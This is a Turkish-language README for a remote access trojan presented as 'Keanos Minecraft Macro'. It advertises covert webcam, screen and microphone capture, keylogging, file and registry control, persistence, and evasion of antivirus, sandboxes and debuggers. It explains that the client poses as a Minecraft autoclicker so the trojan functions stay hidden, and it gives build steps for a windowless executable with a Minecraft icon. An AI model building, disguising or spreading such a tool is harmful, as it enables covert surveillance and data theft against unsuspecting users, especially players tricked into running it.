# Keanos Minecraft Macro (Premium RAT)

## Özellikler
- Anlık ekran yayını (canlı stream)
- Anlık webcam görüntüsü (canlı stream)
- Mikrofon dinleme ve ses kaydı
- IP, konum, sistem bilgisi, hostname, kullanıcı adı, MAC adresi
- Dosya yöneticisi (upload/download/delete/listdir)
- Keylogger, clipboard yönetimi
- Process ve servis yönetimi
- Registry yönetimi
- Komut geçmişi ve canlı log
- Otomatik güncelleme
- Persistence (her açılışta başlama)
- Sandbox/VM/AV tespiti ve anti-debug
- Maksimum maskeleme (Minecraft Macro arayüzü)
- Panelden script yükleme/çalıştırma
- Tüm trafik şifreli

## Kurulum
1. `requirements.txt` ile bağımlılıkları yükle:  
   `pip install -r requirements.txt`
2. Paneli başlat:  
   `python web_panel/app.py`
3. Client'ı derle (pyinstaller ile):
   `pyinstaller --noconsole --onefile --icon=minecraft.ico bb_client.py`
4. (İsteğe bağlı) Inno Setup ile installer hazırla.

## Gizlilik ve Maskeleme
- Client, Minecraft AutoClicker/Macro gibi görünür.
- Tüm RAT fonksiyonları arka planda gizli çalışır.
- Trafik şifreli ve panel endpointleri gizlidir.

## Notlar
- Panel ve client tamamen Türkçe ve İngilizce desteklidir.
- Her şey premium ve profesyonel olarak hazırlanmıştır.
